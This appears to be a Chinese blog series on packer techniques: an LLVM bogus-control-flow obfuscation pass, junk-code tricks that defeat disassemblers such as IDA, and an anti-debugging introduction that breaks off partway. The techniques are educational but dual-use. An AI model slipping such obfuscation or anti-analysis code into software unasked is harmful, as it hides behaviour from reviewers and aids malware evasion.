case 0: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_EQ); break; // equal  case 1: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_NE); break; // not equal  case 2: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_UGT); break; // unsigned greater than  case 3: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_UGE); break; // unsigned greater or equal  case 4: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_ULT); break; // unsigned less than  case 5: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_ULE); break; // unsigned less or equal  case 6: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_SGT); break; // signed greater than  case 7: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_SGE); break; // signed greater or equal  case 8: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_SLT); break; // signed less than  case 9: currentI-\u0026gt;setPredicate(ICmpInst::ICMP_SLE); break; // signed less or equal  } break; } } if (opcode == Instruction::FCmp) { // Conditions (with float)  FCmpInst *currentI = (FCmpInst *)(\u0026amp;i); switch (llvm::cryptoutils-\u0026gt;get_range(3)) { // must be improved  case 0: // do nothing  break; case 1: currentI-\u0026gt;swapOperands(); break; case 2: // randomly change the predicate  switch (llvm::cryptoutils-\u0026gt;get_range(10)) { case 0: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_OEQ); break; // ordered and equal  case 1: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_ONE); break; // ordered and operands are unequal  case 2: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_UGT); break; // unordered or greater than  case 3: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_UGE); break; // unordered, or greater than, or equal  case 4: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_ULT); break; // unordered or less than  case 5: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_ULE); break; // unordered, or less than, or equal  case 6: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_OGT); break; // ordered and greater than  case 7: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_OGE); break; // ordered and greater than or equal  case 8: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_OLT); break; // ordered and less than  case 9: currentI-\u0026gt;setPredicate(FCmpInst::FCMP_OLE); break; // ordered or less than, or equal  } break; } } } } return alteredBB; } // end of createAlteredBasicBlock()   主要是分两部分：\n 复制原始块，并修复伪造块的调试信息与元数据 在伪造块中寻找二元运算、浮点运算、比较指令，在其中插入垃圾指令。  0x03 创建自己的混淆 对 OLLVM 的 bcf 混淆有了初步的映像之后，接下来就可以依样画葫芦抄一个自己的混淆出来啦。\n3.1 方案 作为概念验证，我们的 pass 将原始代码分割成三个基本块，称为 entry、original和terminator。entry 通过一个恒真判断跳转至 original，original 通过恒真判断跳转至 terminator。伪造块 altered 则是 false 分支，内容仅复制 original 块，并在末尾跳转至 original 块。\n伪造块应该永远不会被执行。\n3.2 LLVM编程的重要概念 参考文章：LLVM IR C++ API Tutorial\n关键类型： 清单如下：\n Value Module Type Function BasicBlock BranchInst  列出的这些是 LLVM C++ 接口定义的类，可以通过 Module 获取 Function，可以从 Function 获取 BasicBlock，也可以从 BasicBlock 反过来获取 Function，这些容器间组织成层级关系。\nModule-\u0026gt;Function-\u0026gt;BasicBlock-\u0026gt;Instruction\nValue 是公共基类，Function、BasicBlock，包括各种指令类都是从Value继承。\nPHINode： 参考文章：PhiNode in LLVM\nLLVM的指令类型中包含一种特殊节点叫 PhiNode，PhiNode 的存在是为了解决 LLVM IR 中因 SSA （静态单次赋值）引起的条件初始化问题。示例如下。\n1 2 3 4 5 6 7 8 9 10  int foooooo(int bar){ int i=0; if(bar%2==0){ i=1; //BasicBlock 1  } else{ i=2; //BasicBlock 2  } return i; }   可以看到我们需要按 bar 的取值来初始化 i，但 SSA 要求 i 只能被赋值一次。PhiNode 允许根据基本块选择赋值。\n1 2 3 4 5 6 7 8 9 10  int foooooo(int bar) { if(bar%2==0){ //BasicBlock1  } else{ //BasicBlock2  } int i=Phi([BasicBlock1,1],[BasicBlock2,2]); return i; }   上面的例子也可以改成在栈或堆上开辟空间，以类似指针的方式避开 SSA 约束。\n1 2 3 4 5 6 7 8 9 10 11  int foooooo(int bar) { int* i=malloc(sizeof(int)); if(bar%2==0){ Store Value 1 to the memory location pointed to by i; } else{ Store Value 2 to the memory location pointed to by i; } int j=load from the address pointed by i; return j; }   Terminator: 参考文章：How do Terminator work in LLVM IR\nLLVM中，一个基本块 BasicBlock 总是以终结指令 TerminatorInst 结束的。终结指令不能出现在基本块末尾以外的任何地方。粗略地说，终结指令标识控制流在基本块结束后去往何方。\n每个终结指令都包含一定的后继基本块。\n几个常见的终结指令类型：\n  ReturnInst 就像是普通编程中的的return语句。\n  BranchInst 是跳转指令，包括两类：\n 条件跳转，满足条件时跳转分支1，否则跳转分支2。 非条件跳转，总是跳转到某个分支。    SwitchInst 类似于普通编程里的 switch 语句，可以包含更多的后继块。\n  还有些不那么常见的终结指令：\n invoke 和 catchswitch unreachable  3.3 工具链 参考文章：LLVM Command Guide\n实际动手前先了解下 LLVM工具链，列出一些会涉及到的命令行工具。\n llc 将输入的 LLVM IR(.ll) 编译成指定架构的汇编（或二进制对象文件） lli 将输入的 BitCode(.bc) 解释执行。 llvm-as 汇编器 llvm-dis 反汇编器，可以反汇编 BitCode opt BITCODE/IR 优化器  最好再安装一个 graphviz，因为很多编程语言的命令行工具如果提供图形输出的话，大多是以 dot 形式提供（比如 go 的 pprof 和 LLVM opt 的 dot-cfg）。\n3.3 runOnFunction 参考 OLLVM 的代码，抄出过滤函数。原理不明暂且不深究。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  bool isObfuscateable(const Function \u0026amp;fn) { if (fn.isDeclaration()) { return false; } if (fn.hasAvailableExternallyLinkage()) { return false; } if (!isInvoke(fn)) { return false; } return true; } bool isInvoke(const Function \u0026amp;fn) { for (const BasicBlock \u0026amp;bb : fn) { if (isa\u0026lt;InvokeInst\u0026gt;(bb.getTerminator())) { return false; } } return true; }   然后在入口点简单过滤掉不能混淆的函数，接着遍历基本块，对每个基本块都进行一次混淆。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  bool runOnFunction(Function\u0026amp; F) { if (!isObfuscateable(F)) { errs()\u0026lt;\u0026lt;\u0026#34;function \u0026#34;\u0026lt;\u0026lt; F.getName() \u0026lt;\u0026lt;\u0026#34; is not obfuscateable\\n\u0026#34;; return false; } list\u0026lt;BasicBlock *\u0026gt; blocks; for (BasicBlock \u0026amp;block : F) { blocks.push_back(\u0026amp;block); } for (BasicBlock *block : blocks) { // 原始块分割为三个基本块：entry、original、terminator  // 通过两个恒真条件连接  auto entryBB = \u0026amp;block; auto originalBB = entryBB-\u0026gt;splitBasicBlock(entryBB-\u0026gt;getFirstNonPHIOrDbgOrLifetime(), Twine(\u0026#34;original\u0026#34;)); auto terminatorBB = originalBB-\u0026gt;splitBasicBlock(--originalBB-\u0026gt;end(), Twine(\u0026#34;terminator\u0026#34;)); // 构造伪造块  // 这一步已经构造好了 altered 跳转 original  auto alteredBB = createAlteredBB(originalBB, F); // 清理 terminator，重新构造跳转关系  entryBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); originalBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); // 构造恒真条件，从 entry 跳转到 original  auto lhs = ConstantInt::get(Type::getInt32Ty(F.getContext()), 1); auto rhs = ConstantInt::get(Type::getInt32Ty(F.getContext()), 1); auto condition = new ICmpInst(*entryBB, ICmpInst::ICMP_EQ, lhs, rhs, Twine(\u0026#34;condition\u0026#34;)); BranchInst::Create(originalBB, alteredBB, (Value *)condition, entryBB); // 构造恒真条件，从 original 跳转到 terminator  auto lhs2 = ConstantInt::get(Type::getInt32Ty(F.getContext()), 1); auto rhs2 = ConstantInt::get(Type::getInt32Ty(F.getContext()), 1); auto condition2 = new ICmpInst(*originalBB, ICmpInst::ICMP_EQ, lhs, rhs, Twine(\u0026#34;condition2\u0026#34;)); BranchInst::Create(terminatorBB, alteredBB, (Value *)condition, originalBB); } return false; }   混淆过程非常简单，原始基本块分割成三个部分，清除entry和original的terminator并加入恒真条件跳转，false 分支都指定为 altered 即可。\n3.4 createAlteredBB 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  BasicBlock *createAlteredBB(BasicBlock *original, Function \u0026amp;F) { // 构造伪造块  ValueToValueMapTy VMap; auto altered = CloneBasicBlock(original, VMap, Twine(\u0026#34;altered\u0026#34;), \u0026amp;F); // 修复伪造块的指令  auto originalInstIt = original-\u0026gt;begin(); for (auto \u0026amp;inst : *altered) { // NOTE:  // 参考链接： https://bbs.pediy.com/thread-266201.htm  //  // ... 但是CloneBasicBlock函数进行的克隆并不是完全的克隆，第一他不会对指令的操作数进行替换，比如：  //  // ```  // orig:  // %a = ...  // %b = fadd %a, ...  //  // clone:  // %a.clone = ...  // %b.clone = fadd %a, ... ; Note that this references the old %a and  // not %a.clone!  // ```  //  // 在clone出来的基本块中，fadd指令的操作数不是%a.clone，而是%a。  // 所以之后要通过VMap对所有操作数进行映射，使其恢复正常：  //  for (auto opi = inst.op_begin(); opi != inst.op_end(); opi++) { Value *v = MapValue(*opi, VMap, RF_None, 0); if (v != 0) { *opi = v; } } // 第二，它不会对PHI Node进行任何处理，PHI Node的前驱块仍然是原始基本块的前驱块，  // 但是新克隆出来的基本块并没有任何前驱块，所以我们要对PHI Node的前驱块进行remap：  if (auto pn = dyn_cast\u0026lt;PHINode\u0026gt;(\u0026amp;inst)) { for (unsigned j = 0, e = pn-\u0026gt;getNumIncomingValues(); j != e; ++j) { Value *v = MapValue(pn-\u0026gt;getIncomingBlock(j), VMap, RF_None, 0); if (v != 0) { pn-\u0026gt;setIncomingBlock(j, cast\u0026lt;BasicBlock\u0026gt;(v)); } } } // 元数据  SmallVector\u0026lt;pair\u0026lt;unsigned, MDNode *\u0026gt;, 4\u0026gt; MDs; inst.getAllMetadata(MDs); // 修复调试  inst.setDebugLoc(originalInstIt-\u0026gt;getDebugLoc()); ++originalInstIt; } // 清理原来的 terminator，无条件从 altered 跳转到 original  altered-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); BranchInst::Create(original, altered); return altered; }   去除修复指令操作数和 PhiNode 的部分，其实就是复制了原始块的指令，然后将终结指令改成跳转到原始块而已。\n3.5 编译和测试 使用 CMake 编译，在环境设置一节中已经说明了怎么配置，编译得到了 Hello.dll 后用下面的案例程序测试。\n1 2 3 4 5 6  #include \u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;hello world\u0026#34;); return 0; }   程序保存在 sample/sample.c，测试命令如下。\n1 2 3 4 5 6 7 8 9 10 11  # clang 编译得到 bitcode clang -emit-llvm .\\sample\\sample.c -c -o .\\sample\\sample.bc # opt 启用 hello pass 创建混淆后的新 bitcode opt -enable-new-pm=0 -load .\\build\\Hello.dll -hello .\\sample\\sample.bc -o .\\sample\\sample-optimized.bc # llvm-dis 反汇编混淆后的 bitcode，得到 sample-optimized.ll ，可以拿来看混淆结果 llvm-dis .\\sample\\sample-optimized.bc # llc 将混淆后的 bitcode 编译出汇编文件，也可以编译出 obj 文件，用 -filetype=obj 就行 # 注意 -O0，不然默认优化就会直接把我们伪造的分支给干掉 llc .\\sample\\sample-optimized.bc -O0 -o .\\sample.s # 用 clang 完成最后的汇编和链接 clang sample.s -o sample.exe   也可以用 opt 来获得混淆后的代码控制流视图。\n1  opt -enable-new-pm=0 -dot-cfg -cfg-func-name=main .\\sample\\sample-optimized.bc   在IDA打开后看到的结果如下。\n再来个更复杂的例子：main.c\n3.6 扩展：不透明谓词 参考文章：what is an opaque predicate\nPS：本人没有相关学术背景，内容东拼西凑，如果存在理解错误或者陈述不准确请指出。\n概括地说，不透明谓词就是“某种如果程序分析不够充分，就可能错过的东西”。学术上说不透明谓词是始终在一个方向上执行的分支，对程序创建者已知，对分析器未知。\n例如我们知道程序运行时，LoadLibraryA 加载一个不存在的库会返回 null，但分析器并不清楚我们运行的环境里是否真的存在/不存在这个库，对于分析器来说用LoadLibraryA构造出来的条件跳转就是一个不透明谓词。\n那透明呢？不知道有没有这样的说法，不透明是分析器可能错过的东西的话，透明就是分析器不会错过的东西，比如 xor eax,eax 再紧跟着 test eax,eax，那么jnz的走向对分析器来说就是已知的——除非分析器根本没这功能。\n总结 首先是完整案例代码：packer8 - GitHub\n总结知识点：\n 关键类型：Module、Function、BasicBlock、Instruction \u0026hellip; PhiNode 终结指令，BranchInst、ReturnInst LLVM 工具链：opt、llc、lli、llvm-dis 关于 new pass manager 的坑：-fno-experimental-new-pass-manager、-enable-new-pm=0  用 opt 单独搞混淆很麻烦，也不能集成到已有的 cmake/make 项目里。用 clang 加载混淆器的只需要这样：-Xclang -load -Xclang bcf.dll -fno-experimental-new-pass-manager 就可以直接使用 bcf.dll 参与混淆啦。\nLLVM 13.x 版本的新 pass manager 带来了很多问题，主要是 LLVM 的文档没写怎么把 Pass 注册到新的 PM 里，结果 opt 能跑 clang 又没运行 pass ，就搜来搜去花了很多时间\u0026hellip;不过实际动手写过之后会发现 LLVM 是个大宝库，特别适合发挥想象。Pass 来扩展编译器功能还是挺方便扩展的，也能一窥LLVM内部的奇妙世界。\n原本还打算看看控制流扁平化，毕竟OLLVM都已经开始看了，控制流扁平化不看一下感觉有点说不过去。但是实际上手发现没耐心再读一遍这代码了=。=也许下次。OLLVM代码解读好像有不少帖子了吧，不献丑了。控制流扁平化的代码量也不是很多，慢慢读还是能捋清楚逻辑的。\n另外还可以发挥想象：能不能用 LLVM Pass 往代码里插入花指令？\n参考资料：\n CMake out of source pass - LLVM Writing an LLVM Pass - LLVM LLVM IR C++ API Tutorial PhiNode in LLVM How do Terminator work in LLVM IR LLVM Command Guide OLLVM 虚假控制流源码学习笔记 - 看雪论坛 0x3f97/ollvm-12.x  ","date":"2021-11-03T16:54:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-08/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-08/","title":"加壳原理08：混淆技术入门"},{"content":"前言 个人浅见，一般分析一个程序可以有动态和静态两条路，动态一般指的就是调试或者别的运行时跟踪程序行为的方式了，除了调试器外就是抓取事件、日志、API调用记录、看内存数据等，比如有 Frida，还有内存搜索如CE。静态则是用各种工具在不实际运行程序的前提下，从程序文件里提取有用的信息。\n对于运行时的对抗手段很多，毕竟程序都跑起来了，你来我往打擂台嘛。而且在Windows这个闭源平台上，还可以靠不大可能被动手脚的内核来保护自己，Linux上就可能内核都是被魔改过的。\n但是对静态分析就没有什么特别好的办法，又要人造的计算机能正确运行，又要人不能理解，就有点矛盾。\n广为人知的对抗静态分析的手段有这些：\n 混淆，把程序逻辑转换成更晦涩但等价的形式。 加花，对抗反汇编引擎，利用反汇编工具的算法缺陷、漏洞来迫使分析者必须花费大量时间处理错误的反汇编结果，让诸如控制流视图之类的工具失效。  混淆和加花的主要区别 在我这 定义为 混淆是变换原程序逻辑，花指令不改变原程序逻辑 。\n这些对抗手段主要的目的都是 消磨耐心 和 拖延时间 ，抬高人肉分析的成本。但混淆加花这种手段是无法做到只让机器读懂代码而人读不懂这种效果的。这个结论忘了是哪篇论文里提到的了。\n本篇只讲如何对抗反汇编，也就是花指令技术。\n0x01 花指令原理 1.1 机器码指令格式 码农日常工作接触的是高级语言（这个概念可能有争议，反正相对汇编、机器码这个层级来说都是高级语言就对了），汇编和机器码这种满是历史尘埃的领域是绝无机会接触的。但要理解花指令，首先要理解汇编代码的二进制表示，才会明白为什么反汇编工具的力量是有极限的。\n这是 Intel 的 64-ia-32-architectures-software-developer-instruction-set-reference-manual 里的一张图，说明了汇编指令如何以二进制形式保存。可以简单看成3部分，1字节的可选前缀，1-3字节的opcode部分，剩余描述操作数的部分。\n几个要素：\n 指令长度不固定，最短 1 字节，最长可能有 14 （图中全部相加，实际会不会有我就不知道了）。 一条汇编代码里的指令可能对应很多不同的 opcode ，简单到 add 这样的指令也会有很多种不同形式。  熟悉机器码格式在自己构造花指令的时候大概会有用，但实话说 Intel 这手册看得我头痛。所以还是直接快进到花指令原理。\n1.2 花指令原理 花指令的英文是 junk code ，也就是垃圾代码。实际上花指令的确是一些不影响程序逻辑的 垃圾 机器码，它存在的唯一意义就是干扰反汇编引擎和人肉分析。\n花指令有两种类型：\n 不可执行的花指令 可执行的花指令  听起来像是废话但实际上构造这两种花指令的难度是完全不一样的。\n对于不可执行的花指令，本质上我们做的事情是在跳转指令之后插入一个多字节指令的字节，欺骗反汇编器将这个字节之后的几个字节当成一个多字节指令解释，进而造成后续指令反汇编出错。\n而可执行的花指令，本质是将指令的组成部分重新解释执行。像是一个2字节的跳转指令，第二个字节是操作数，但操作数可以是 0xff，也就是带符号的 -1，使 EIP 落在 0xff 这个字节上，将0xff作为指令继续执行。这个过程中0xff既可以被当成数字0xff解释，也被当成了指令来解释。\n1.3 反汇编算法 目前常见反汇编算法就两类，一类是线性反汇编，对输入的数据逐字节翻译成汇编代码。这种反汇编算法多数时候工作地很好，但属于老实人，认为指令总是一个接一个出现，一个简单地在jmp后插入0xe8就能骗到。\n另一类是基于代码流分析的算法，这类算法的特点是不会无脑地继续反汇编跳转指令之后的代码，而是去优先反汇编 可达 的代码。像是我们在 C 里面写 if (1) {} else { /* junk code */ }，对于足够聪明的编译器，else 分支就是明确无误的垃圾。对于这种反汇编算法，可以通过可执行的花指令来欺骗，或构造反汇编器无法判断真假的恒真/恒假分支，再插入不可执行的花指令来达到欺骗效果。\n0x02 花指令案例 2.1 E8 和线性反汇编算法 E8 是 call 指令的 opcode。opcode operation code 也叫指令机器码 Instruction Machine Code，就是汇编指令翻译后的二进制形式。贴一个 wiki 百科的 x86 指令列表 以供参考。还有 x86 instruction set reference 。还有 How does the CPU distinguish \u0026lsquo;CALL rel16\u0026rsquo; (E8 cw) and \u0026lsquo;CALL rel32\u0026rsquo; (E8 cd)?\n我们的程序运行在用户模式（32位）模式下，E8 指令后紧跟着的是4字节的相对偏移，一条完整的 E8 指令会使用 5 个字节的空间。\n下面是一个 E8 花指令的案例，需要 MinGW 编译，对 x32dbg 有效。\n1 2 3 4 5 6  #define ANTI_LINEAR_DISASSEMBLE_ALGORITHM_1 asm(\u0026#34;jmp next\\n.byte 0xe8;\\nnext:\\n\u0026#34;)  int start(void) { ANTI_LINEAR_DISASSEMBLE_ALGORITHM_1; return 0; }   编译命令\n1  gcc demo.c \u0026#39;-Wl,--entry=_start\u0026#39; -nodefaultlibs -nostartfiles -o demo   调试器内的效果\n可以看到在 jmp 指令后，反汇编出了一条 call 指令。但实际上我们写的代码里是没有任何函数调用的。而在这个 E8 后面的 B8 00 00 00 00 5D C3 才是真正会执行的代码：\n1 2 3  mov eax, 0 ; B8 00 00 00 00 pop ebp ; 5D retn ; C3   参考intel 80x86 assembly language opcodes。\n如果仔细看 jmp 后的偏移 01 的话也能猜到下一个 E8 是不会被执行的。\n像是这种简单的花指令在 IDA 里没用，IDA 的反汇编算法会根据控制流分析来判断哪些内容不会被执行，进而产生下面的结果。\n2.2 IDA 和代码流反汇编算法 关于IDA的反汇编算法描述是来自《恶意代码分析实战》。\n 前面讨论的简单对抗反汇编技术是巧妙地在条件跳转指令之后放一个字节，这种技术的思路是，从这个字节开始反汇编，阻止其后真正的指令被反汇编，因为插入的字节是一个多字节指令的机器码。我们称这样的字节是流氓字节，因为它不属于程序的一部分，只是用在代码段迷惑反汇编器。\n IDA的反汇编算法是针对代码流的反汇编，基本思路是记录反汇编过程中的跳转地址作为下一次反汇编的起点，当控制流转移（jmp之类的跳转指令）时，并不是从跳转指令之后继续反汇编，而是从之前记录的跳转地址里选一个，开始新的反汇编工作。如上面的 jmp + e8 就无法对抗这种反汇编算法。\n目前实践中也发现，IDA 已经可以识别出一些例如 jz+jnz 制造的无条件跳转，通过控制流指令制造恒真或恒假条件来跳转大概会往更加复杂、高开销的方向走：比如利用系统API、环境中的已知常量作为条件去欺骗IDA，让 IDA 无法轻易认定某条分支是无效分支，进而干扰反汇编结果。\n那么除了插入多字节指令还有什么办法对抗代码流分析算法呢？\n \u0026hellip;但是，如果流氓字节不能被忽略怎么办？如果它是合法指令的一部分，且在运行时能够被正确执行怎么办？这里，我们碰到一个棘手的问题，所有给定字节都是多字节指令的一部分，而且它们都能够被执行。目前业内没有一个反汇编器能够将单个字节表示为两条指令的组成部分，然而处理器没有这种限制。\n 下面是一个案例。\n1  .byte 0xeb,0xff,0xc0,0x48   0xeb jmp 指令的 opcode，是一个 2 字节指令。0xff 被解释为 -1。\n0xff 是 INC 的机器码，0xc0是操作数，表示 eax，也就是 inc eax。可以在这个在线反汇编网站上验证。\n0x48 则是 dec eax 的汇编指令，因此这4个字节执行后最终不会影响 eax 的值。\n在这里，0xff 同时被解释为 jmp 的操作数和 inc 指令，并且能正常执行，但反汇编器则会被迷惑。\n上图是IDA中反汇编的结果。\n2.3 构造能欺骗IDA的花指令 构造能欺骗IDA的花指令简单的办法就是构造无法被静态分析的恒真/恒假条件。举例来说，LoadLibraryA 加载失败会返回 NULL，就可以被用来构造花指令。\n1 2  LoadLibraryA(\u0026#34;not-exists.dll\u0026#34;); asm(\u0026#34;test %eax,%eax;\\njz next;\\n.byte 0xe8;\\nnext:\\n\u0026#34;);   可以看到，IDA不能静态分析出LoadLibraryA 的返回值是 NULL，顺着 jz 的 False 分支反汇编时遇到了 0xe8，于是后续的反汇编结果就完全乱了套。\n2.4 破坏栈帧分析 还有一种花指令是通过对 call 和 ret 利用来实现破坏栈帧分析。大家都知道 call 和 ret 就是 push+jmp和pop+jmp，如果我们手动在函数里再构造一个假函数，跳转之后修改栈上的返回地址，返回到我们希望继续执行的位置，虽然本质上是个 GOTO 的操作，但 IDA 就会懵圈了。\n一个简单的例子如下，call跳转到下一行，修改返回地址到 continue 后又ret，结果就是在 continue 这个标签处继续执行。\n1 2 3 4 5 6 7  asm( \u0026#34;call next;\\n\u0026#34; \u0026#34;next:\\n\u0026#34; \u0026#34;movl $continue,(%esp);\\n\u0026#34; \u0026#34;ret;\\n\u0026#34; \u0026#34;continue:\\n\u0026#34; );   产生的代码在IDA里分析会出现这样的 sp-analysis failed。\n这个思路可以反复嵌套，增加跳转的次数和深度，甚至把正常逻辑隐藏在这种反复跳转中，但从高级语言层面手工加这种花很困难。\n再给一个复杂一些的例子，同样是利用了 call 和 ret 来实现花式跳转。\n来自52论坛的：一些简单的花指令的解析(含Intel指令集) - 『病毒分析区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn。\n顺便一提，链接里那个 pop ss 也很有意思，GrandCrab 的案例也是结合了多种控制流指令来完成跳转，阻碍IDA分析。\n总结 首先，不只是E8，不要局限在这里。所有的多字节指令都可以用来构造花指令。花指令也不只是利用多字节指令干扰反汇编，也能精心伪造控制流对抗分析工具的其他高级分析功能，迫使分析者不能无脑F5读伪代码，消磨分析者的时间、精力、耐心。\n花指令有很多模式，但一个显著特征是 跳转，必须通过跳转指令来实现越过不可执行的花指令，或通过跳转来实现重新解释已经被解释过的指令的一部分，以及通过连续跳转来隐藏真实跳转地址。所以看到莫名其妙地开始跳起来就要警惕了，这会儿很可能正在分析无效的垃圾代码。\n编写花指令的时候应该注意到，花指令对抗的目标不是分析工具，而是分析者。简单地写一个jz和E8也许实现了让分析工具出错的目的，但分析者一眼就能看出这是无效代码，基本无法起到对抗作用。\n参考资料：\n 恶意代码分析实战 (豆瓣) (douban.com) 一个利用call+ret修改返回地址的花指令分析 - OneTrainee - 博客园 (cnblogs.com) 一些简单的花指令的解析(含Intel指令集) - 『病毒分析区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn Combined Volume Set of Intel® 64 and IA-32 Architectures Software Developer’s Manuals [原创]汇编指令之OpCode快速入门-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com x86 and amd64 instruction reference (felixcloutier.com) Intel 80x86 Assembly Language OpCodes (mathemainzel.info) online x86 disassembler 花指令模糊变换策略研究与实现 - 豆丁网 (docin.com)  特别推荐最后这篇论文，我没找到在哪儿能下，就放原链接了。直接百度学术搜花指令也能找到很多有意思的文章（尽管形式化描述的部分基本都没看懂）。\n自动化的加花方式基本要求在汇编层面去重排代码或者插入代码，直接在二进制文件上加花我寻思了一下是蛮难的，主要是正常程序代码段里随便插东西的话，重定位和重新算各种文件字段很麻烦。所以吧\u0026hellip;大概在编译器层面（LLVM？或者对生成的汇编文件下手）才会比较好施展开。\n","date":"2021-10-31T17:14:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-07/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-07/","title":"加壳原理07 - 花指令入门"},{"content":"前言 反调试技术，往大了说是用尽一切手段防止运行时对程序的非法篡改和窥视，往小了说就是防调试器。反正反调试这件事和各种技术都能搭点边，什么HOOK啦DLL注入啦。真要给涉及到的各方面都说得头头是道，那我这个菜鸡就不叫菜鸡了。\n反正涉及的各种技术细节吧，将来都会慢慢学到的。也不急于一时。本篇关注的重点还是在导，引入，了解个大概。看看有什么反调试思路，对付这些反调试技术又有什么 bypass 的手段。\n说这么多，其实还是找了篇写得不错的外文文章，抄了然后调试了下案例。\n0x01 反调试思路 首先概述一下本篇主要的反调试思路。\n1.1 系统API或数据结构 操作系统提供了一些调试标志位，调试器启动的进程会有标识。调试器也可能会为了提供更好的调试体验，修改一些参数，让我们有迹可循。\n PEB-\u0026gt;BeingDebugged和IsDebuggerPresent PEB-\u0026gt;NtGlobalFlag PEB-\u0026gt;HEAP-\u0026gt;Flags和PEB-\u0026gt;HEAP-\u0026gt;ForceFlags CheckRemoteDebuggerPresent NtQueryInformationProcess  ProcessDebugPort ProcessDebugObjectHandle ProcessDebugFlags ProcessBasicInformation   NtSetInformationThread和NtCreateThreadEx  利用 HideFromDebugger 标志位来对调试器隐藏自身。    1.2 SEH、VEH 总的来说，利用 SEH 和 VEH 机制，尝试抛出一些会被调试器处理的中断或异常，同时自己挂一个处理函数，如果异常被调试器捕获了，那自己挂的异常处理函数就不会被调用，借此判断是否有调试器正在调试程序。\n TF标志位和INT 1中断 INT 3 中断和 SEH 处理函数，__try __except 或 MinGW 的 __try1 __except1，顺便一提我的SEH实验没成功。但是 VEH 基本没问题。 DBG_PRINTEXCEPTION_WIDE_C和DBG_PRINTEXCEPTION_W，Windows 10 OutputDebugString 利用了这个 Exception 来抛出调试字符串。 EXCEPTION_INVALID_HANDLE  1.3 调试寄存器 GetThreadContext 获取当前上下文，判断 Dr0-Dr3寄存器的值。\n1.4 完整性校验 原理是调试器通过临时修改断点处指令为中断来取得程序控制权，可以用CRC校验，或者更简单点，直接逐字节求和，判断代码是否被篡改。\n0x02 系统API方式 2.1 IsDebuggerPresent 首先出场的就是 IsDebuggerPresent 这个 API 了，文档可以在这里找到。简要概述一下这个接口，微软的描述是此函数允许应用程序确定自己是否正在被调试，并依此改变行为。例如通过OutputDebugString函数提供更多调试信息。\n微软的本意应该是一个调试开关式的东西，正经写过工作代码应该知道代码里加个调试开关方便在出问题的时候拿详细日志是很有用很方便的，同时也能在不需要调试的时候也不会让程序不会损失太多性能。比起编译期的调试开关_DEBUG宏之类的会更灵活一些。\n扯远了。总之，这个函数没参数，返回BOOL，案例很好写。\n1 2 3 4 5 6 7  #include \u0026lt;debugapi.h\u0026gt; void anti_debug_by_isDebuggerPresent(void) { if (IsDebuggerPresent() == TRUE) { MessageBoxA(NULL, \u0026#34;debugger detected\u0026#34;, \u0026#34;IsDebuggerPresent\u0026#34;, MB_OK); } }   就是这样。\nIsDebuggerPresent 这个 API 的实现方式是从 PEB Process Environment Block 读取 BeingDebugged 字段。随便什么调试器跳转过去就能看到这样的实现代码。\n1 2 3  mov eax, dword ptr fs:[0x30] movzx eax, byte ptr ds:[eax+0x2] ret   fs:[0]是 TEB Thread Environment Block 结构的地址，其中fs:[0x30] 这个偏移是 PEB 指针，第一行的意思是将 PEB 指针赋值给 eax 寄存器。\n第二行就是从 PEB 结构的 0x2 偏移处，也就是 BeingDebugged 字段，取 1 字节，赋值到 eax 。\n第三行就是返回了，没有参数和局部变量所以也没平栈，无论 __cdecl 还是 __stdcall 都是在 eax 寄存器保存返回值。\n从wiki 和 NTAPI UNDOCUMENTED FUNCTIONS 查询到的文档都能看到 PEB 结构的内存布局。\n想要 bypass 这种检查就非常容易，修改 PEB 结构中的 BeingDebugged 字段值为 0 就完事了。\n2.2 NtGlobalFlag NtGlobalFlag 也是一个 PEB 的字段，但是在微软官方的 PEB 结构文档和定义里没有给出这个字段（在 Reserved 里）。查阅上面提到的文档或者用 WinDbg 的 dt 命令都可以查到。\n当这个字段包含特定标志位（0x20 | 0x40，分别是 FLG_HEAP_ENABLE_TAIL_CHECK 和 FLG_HEAP_ENABLE_FREE_CHECK）的时候提示有调试器存在（Geoff Chappell, Software Analyst，RtlGetNtGlobalFlags()，没微软的文档）。\n这里给出 WinDbg 查到的字段偏移。微软商店里的 WinDbg Preview 也是一样的。关于 dt 命令可以用 .hh dt 来查阅命令的文档，? 来查阅可用命令，或者直接点上面的帮助。\n1 2 3  0:000\u0026gt; dt _peb NtGlobalFlag @$peb ntdll!_PEB +0x068 NtGlobalFlag : 0x70   可以看到偏移是 0x68，WinDbg 